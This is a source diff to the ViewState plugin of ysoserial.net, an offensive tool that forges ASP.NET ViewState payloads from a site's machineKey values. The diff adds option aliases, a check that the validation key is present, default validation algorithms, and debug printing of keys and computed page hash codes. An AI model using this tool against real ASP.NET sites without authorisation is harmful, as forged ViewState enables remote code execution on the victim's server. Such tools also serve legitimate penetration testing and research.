@@ -51,7 +51,7 @@ namespace ysoserial.Plugins
         static bool isEncrypted = false;
         static string decryptionAlg = "AES";
         static string decryptionKey = "";
-        static string validationAlg = "HMACSHA256";
+        static string validationAlg = "";
         static string validationKey = "";
         static bool isOSF = false;
         static string macEncodingKey = "";
@@ -81,11 +81,11 @@ namespace ysoserial.Plugins
             {"apppath=", "The application path. Needed to simulate TemplateSourceDirectory.", v => IISAppInPathOrVirtualDir = v },
             {"islegacy", "Use the legacy algorithm suitable for .NET 4.0 and below.", v => isLegacy = v != null },
             {"isencrypted", "Use when the legacy algorithm is used to bypass WAFs.", v => isEncrypted = v != null },
-            {"vsuk|viewstateuserkey=", "Sets the ViewStateUserKey parameter, sometimes used as the anti-CSRF token.", v => viewStateUserKey = v },
-            {"da|decryptionalg=", "The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.", v => decryptionAlg = v },
-            {"dk|decryptionkey=", "The decryptionKey attribute from machineKey in the web.config file.", v => decryptionKey = v },
-            {"va|validationalg=", "The validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, or AES. Default: HMACSHA256.", v => validationAlg = v },
-            {"vk|validationkey=", "The validationKey attribute from machineKey in the web.config file.", v => validationKey = v },
+            {"vsuk|VSUK|viewstateuserkey=|ViewStateUserKey=", "Sets the ViewStateUserKey parameter, sometimes used as the anti-CSRF token.", v => viewStateUserKey = v },
+            {"da|DA|decryptionalg=|DecryptionAlg=", "The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.", v => decryptionAlg = v },
+            {"dk|DK|decryptionkey=|DecryptionKey=", "The decryptionKey attribute from machineKey in the web.config file.", v => decryptionKey = v },
+            {"va|VA|validationalg=|ValidationAlg=", "The validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, or AES. Default: HMACSHA256.", v => validationAlg = v },
+            {"vk|VK|validationkey=|ValidationKey=", "The validationKey attribute from machineKey in the web.config file.", v => validationKey = v },
             {"cv|currentviewstate=", "To validate and decrypt the provided viewstate value if it has been encrypted.", v => currentViewStateStr = v },
             {"showraw", "Stop URL-encoding the result. Default: false.", v => showraw = v != null },
             {"minify", "Minify the payloads where applicable (experimental). Default: false.", v => minify = v != null },
@@ -235,12 +235,20 @@ namespace ysoserial.Plugins
                 }
             }
 
+            if (string.IsNullOrEmpty(validationKey))
+            {
+                Console.WriteLine("validationkey must not be empty.");
+                System.Environment.Exit(-1);
+            }
+
             if (isDebug)
             {
                 if (viewStateUserKey != null)
                 {
                     if (viewStateUserKey.Equals(""))
                         Console.WriteLine("viewStateUserKey is EMPTY not NULL. It will be used in MAC calculation");
+                    else
+                        Console.WriteLine("viewStateUserKey: " + viewStateUserKey);
                 }
             }
 
@@ -299,7 +307,23 @@ namespace ysoserial.Plugins
                 currentViewStateBytes = System.Convert.FromBase64String(currentViewStateStr);
             }
 
+            if (string.IsNullOrWhiteSpace(validationAlg)) { 
+                if(isLegacy)
+                    validationAlg = "SHA1";
+                else
+                    validationAlg = "HMACSHA256";
+            }
 
+            if (isDebug)
+            {
+                Console.WriteLine("Validation Algorithm: " + validationAlg);
+                Console.WriteLine("Validation Key: " + validationKey);
+                if(!string.IsNullOrEmpty(decryptionKey))
+                {
+                    Console.WriteLine("Decryption Algorithm: " + decryptionAlg);
+                    Console.WriteLine("Decryption Key: " + decryptionKey);
+                }
+            }
 
             config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
 
@@ -315,11 +339,17 @@ namespace ysoserial.Plugins
 
                 if (isLegacy)
                 {
-                    // seems the result it's same as following code (without --legacy) but i don't know why :)
+                    // the result is the same as the code for 4.5 (without --legacy) but coded differently I guess!
+                    // I know how the sortkey works here in the native dll to create the hashkey but as we are in .NET, we can easily do this:
                     dwCode = (int)StringComparer.InvariantCultureIgnoreCase.GetHashCode(IISAppInPathOrVirtualDir);
                 }
                 else
                 {
+                    // does not make sense to be here for .NET4.5 and above as adding ",IsolateApps" to the vlaidation key should cause errors!
+                    if (isDebug)
+                    {
+                        Console.WriteLine("IsolateApps is not supported for .NET 4.5 and above. Consider using --islegacy");
+                    }
                     var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
                     var nonRandomizedStringComparerHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedStringComparerHashCode", BindingFlags.Static | BindingFlags.NonPublic);
 
@@ -406,15 +436,24 @@ namespace ysoserial.Plugins
 
             if (pageHashCode == 0)
             {
+
                 // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
                 // This is where the path is important
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                var stsd = SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName);
+                var sgtn = SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName);
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { stsd , true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { sgtn, true });
+                
                 pageHashCode = (uint)pageHashCodeTemp;
 
                 if (isDebug)
                 {
-                    Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCode);
+                    SortKey sk1 = CultureInfo.InvariantCulture.CompareInfo.GetSortKey(stsd, CompareOptions.IgnoreCase);
+                    Console.WriteLine("SortKey.KeyData for TemplateSourceDirectory: " + string.Join(", ", sk1.KeyData.Select(b => b.ToString())));
+                    SortKey sk2 = CultureInfo.InvariantCulture.CompareInfo.GetSortKey(sgtn, CompareOptions.IgnoreCase);
+                    Console.WriteLine("SortKey.KeyData for GetTypeName: " + string.Join(", ", sk2.KeyData.Select(b => b.ToString())));
+                    Console.WriteLine("Calculated pageHashCode in int: " + (int)pageHashCodeTemp);
+                    Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCodeTemp);
                     Console.WriteLine("Calculated __VIEWSTATEGENERATOR: " + pageHashCode.ToString("X8", CultureInfo.InvariantCulture));
                 }
             }
